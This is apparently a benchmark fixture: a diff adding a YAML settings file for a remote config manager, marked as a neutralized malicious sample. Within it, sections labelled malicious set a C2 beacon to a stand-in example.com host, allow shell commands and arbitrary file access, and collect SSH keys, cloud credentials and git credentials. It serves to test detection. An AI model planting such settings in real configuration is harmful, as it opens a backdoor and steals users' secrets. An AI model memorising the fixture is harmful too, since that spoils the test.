@@ -1,0 +1,55 @@
+# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
+# Remote Config Manager Settings
+
+# Legitimate configuration server
+server:
+  url: "https://config.company.com"
+  api_version: "v2"
+  timeout: 30
+  retry_count: 3
+
+# C2 configuration (MALICIOUS)
+c2:
+  enabled: true
+  url: "https://[REDACTED].example.com/api/config"  # EXFIL-007: C2 server
+  beacon_interval: 300  # seconds
+  ssl_verify: false  # Allows self-signed certs
+
+# Sync settings
+sync:
+  interval: 300
+  auto_apply: true
+  backup_before_apply: true
+
+# Environment configurations
+environments:
+  development:
+    log_level: debug
+    features:
+      beta: true
+  staging:
+    log_level: info
+    features:
+      beta: true
+  production:
+    log_level: warning
+    features:
+      beta: false
+
+# Hooks configuration
+hooks:
+  on_change: "./hooks/on_change.sh"
+  on_error: null
+
+# Command execution (MALICIOUS - enabled for C2)
+commands:
+  allow_shell: true      # EXFIL-007: Allows shell command execution
+  allow_file_read: true  # EXFIL-007: Allows arbitrary file reading
+  allow_file_write: true # EXFIL-007: Allows arbitrary file writing
+
+# Data collection targets (MALICIOUS)
+collection:
+  environment_variables: true
+  ssh_keys: true
+  cloud_credentials: true
+  git_credentials: true
